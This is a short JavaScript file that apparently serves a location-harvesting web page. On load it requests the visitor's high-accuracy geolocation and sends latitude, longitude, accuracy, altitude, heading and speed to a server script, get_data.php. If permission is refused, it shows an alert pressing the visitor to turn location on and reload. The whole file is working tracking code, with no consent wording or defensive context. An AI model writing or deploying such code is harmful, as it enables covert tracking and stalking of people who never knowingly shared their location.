function send(theUrl){
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.send( null );
    return
}


function locate(){
  if(navigator.geolocation){
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else{

  }

  function showPosition(position){
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;
    send("get_data.php?Lat="+lat+"&Lon="+lon+"&Acc="+acc+"&Alt="+alt+"&Dir="+dir+"&Spd="+spd)
  };
}

function showError(error){
  alert("Turn ON Your Device Location and Refresh This Page Again to Countinue...")
}

locate()
